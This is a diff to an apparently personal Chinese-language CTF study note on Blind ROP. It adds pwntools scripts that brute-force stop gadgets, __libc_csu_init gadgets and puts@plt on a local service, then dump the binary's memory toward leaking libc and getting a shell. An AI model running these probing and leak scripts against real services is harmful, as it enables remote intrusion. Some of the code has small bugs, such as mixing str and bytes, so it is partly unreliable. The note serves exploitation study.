@@ -606,13 +606,194 @@ if __name__ == "__main__":
 
 
 
-### 
+### 寻找 stop gadgets
+
+> 通常addr初始值设为`0x400000`，但这个题目我为了节约时间就改成`0x4006b0`，通常在`_start`入口处前后会有`stop_gadgets`
+
+```python
+def get_stop_addr(length):
+  addr = 0x4006b0  # No PIE
+  while 1 :
+    try :
+      io = remote('127.0.0.1', 9999)
+      io.recvuntil(b'WelCome my friend,Do you know password?\n')
+      payload = b'a'*length + p64(addr)
+      print('Temporary address is 0x%x'%(addr))
+      io.sendline(payload)
+      content = io.recv()  # if recv() doesn't cause crash, it means that it is a stop gadgets
+      io.close()  # sometimes _start will not cause crash
+      print('One success addr: 0x%x' % (addr))
+      print('When the addr is found successfully, you will recieve the message from the remote: ',content)
+      return addr
+    except Exception:
+      addr += 1
+      io.close()
+```
+
+结合中间输出可以让结果有迹可循一点，次数找到了`0x4006b6`，为了找到开始地址，可以输出程序没有崩溃时的接收结果，看是否与程序开始时候的提示一致。
+
+![brop_stop_gadgets](D:\Github\pwn\pwn_study\images\brop_stop_gadgets.png)
 
 
 
+### 寻找 brop gadgets
+
+> 此处是为了找到`__libc_csu_init`的末尾那一段重要部分，即
+>
+> ```assembly
+> [*] 
+> pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15, ret
+> [*] + 0x7 
+> pop rsi, pop r15, ret
+> [*] + 0x9
+> pop rdi, ret
+> ```
+>
+> 需要借助
+>
+> ```C
+> > probe, trap, trap, trap, trap, trap, trap, stop, traps
+> 
+> [*] probe : testing pointer.
+> [*] traps : (trap, trap,...), you can add 10 traps or more to avoid the special situations.
+> [*] Sometimes p64(0) is a good example of trap.
+> ```
+>
+> 来识别
+
+识别`brop gadgets`代码如下
+
+```python
+def get_brop_gadget(length, stop_addr, addr):
+  try:
+    io = remote('127.0.0.1',9999)
+    io.recvuntil(b'WelCome my friend,Do you know password?\n')
+    payload = b'a'*length + p64(addr) + p64(0)*6 + p64(stop_addr) + p64(0)*10
+    io.sendline(payload)
+    content = io.recv()
+    io.close()
+    print(content)
+    # stop gadget returns memory
+    if not content.startswith(b'WelCome'): <---注意这里判断的必须是 bytes 类型, 所以需要在string头加一个b
+      return False
+    return True
+  except:
+    io.close()
+    return False
+  
+def check_brop_gadget(length, addr):
+  """ Just for checking brop possible gadget """
+  try:
+    io = remote('127.0.0.1',9999)
+    io.recvuntil(b'WelCome my friend,Do you know password?\n')
+    payload = b'a'*length + p64(addr) + b'a'*8*10
+    io.sendline(payload)
+    io.close()
+    return False
+  except:
+    io.close()
+    return True
+  
+def brop_gadget(length, stop_gadget, init_addr):
+  addr = init_addr
+  while 1:
+    print(hex(addr))
+    if get_brop_gadget(length, stop_gadget, addr):
+      print('possible brop gadget: 0x%x' % (addr))
+      if check_brop_gadget(length, addr):
+        print('success brop gadget: 0x%x' % (addr))
+        break
+    addr += 1
+  return addr
+```
 
 
 
+### 确定 addr->puts@plt
+
+> #### Method
+>
+> 1. 对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。
+> 2. 寻找 puts 函数 (这里我们寻找的是`plt`)，我们自然需要控制 `rdi` 参数，在上面，我们已经找到了 `brop gadget`。那么，我们根据 `brop gadget` 偏移 `0x9` 可以得到相应的 `gadgets`（由 ret2libc_csu_init 中后续可得）。同时在程序还没有开启 PIE 保护的情况下，`0x400000` 处为 ELF 文件的头部，其内容为 `\ x7fELF`。所以我们可以根据这个来进行判断。一般来说，其 payload 如下
+
+1. 关于`rdi_ret`的获取
+
+   ```python
+   rdi_ret = brop_gadget_addr + 0x9
+   ```
+
+2. 关于`payload`
+
+```python
+def get_puts_addr(length, rdi_ret, stop_gadget):
+  addr = 0x400000
+  while True:
+    print(hex(addr))
+    io = remote('127.0.0.1', 9999)
+    io.recvuntil(b'password?\n')
+    payload = b'A'*length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
+    io.sendline(payload)
+    try:
+      content = io.recv()
+      if content.startswith(b'\x7fELF'):  
+        # remenber add 'b' to your string
+        print('Find puts@plt addr: 0x%x' % (addr))
+        return addr
+      io.close()
+      addr += 1
+    except Exception:
+      io.close()
+      addr += 1 
+```
+
+最终得到地址为`0x400555`（不同的`libc`地址是不同的）
+
+> 借此可以确定在泄漏`puts@got`地址后找到`puts`的真正的地址，进而泄漏`libc`的版本
+
+![brop_puts@plt](D:\Github\pwn\pwn_study\images\brop_puts@plt.png)
+
+### 泄漏 addr->puts@got
+
+> 1. 泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell
+> 2. 我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了，0x1000 = 16 bytes * 256
+
+```python
+def leak_unit(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
+  io = remote('127.0.0.1',9999)
+  payload = b'a'*length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
+  io.recvuntil(b'password?\n')
+  io.sendline(payload)
+  try:
+    data = io.recv()
+    io.close()
+    try:
+      data = data[:data.index(b'\nWelCome')]
+    except Exception:
+      data = data
+    if data == "":
+      data = '\x00'
+    return data
+  except Exception:
+    io.close()
+    return None
+  
+def leak_memory(length, stop_gadget, brop_gadget, rdi_ret, puts_plt, init_addr):
+  result = ""
+  addr = init_addr
+  while addr < 0x401000:
+    print('\n', hex(addr))
+    data = leak_unit(length, rdi_ret, puts_plt, addr, stop_gadget)
+    if data is None:
+      continue
+    else:
+      result += data
+    addr += len(data)
+  """ Restore the memory leaked from the exploit script """
+  with open('code', 'wb') as f:
+    f.write(result)
+```
+
+ 
 
 
 
